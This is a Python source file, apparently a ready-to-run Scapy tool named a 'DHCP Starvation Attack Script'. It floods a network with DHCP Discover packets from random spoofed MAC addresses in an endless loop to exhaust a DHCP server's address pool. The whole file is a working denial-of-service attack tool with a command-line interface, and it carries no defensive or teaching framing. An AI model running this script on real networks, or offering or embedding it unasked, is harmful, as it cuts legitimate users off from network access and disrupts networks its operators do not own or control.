from scapy.all import *
import random
import argparse

def generate_random_mac():
    """Generate a random MAC address."""
    mac = [0x00, 0x16, 0x3e,  # Common OUI prefix
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def send_dhcp_discover(interface):
    """Send a DHCP Discover packet with a random MAC address."""
    mac = generate_random_mac()
    print(f"[+] Sending DHCP Discover from MAC: {mac}")

    ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=mac2str(mac), xid=random.randint(1, 900000000), flags=0x8000)
    dhcp = DHCP(options=[("message-type", "discover"), ("end")])

    pkt = ether / ip / udp / bootp / dhcp
    sendp(pkt, iface=interface, verbose=False)

def mac2str(mac):
    """Convert MAC address to byte format needed by BOOTP chaddr field."""
    return bytes.fromhex(mac.replace(':', '')) + b'\x00' * 10

def main():
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack Script")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g. eth0)")
    args = parser.parse_args()

    print("[*] Starting DHCP starvation attack... (Press Ctrl+C to stop)")
    try:
        while True:
            send_dhcp_discover(args.interface)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")

if __name__ == "__main__":
    main()
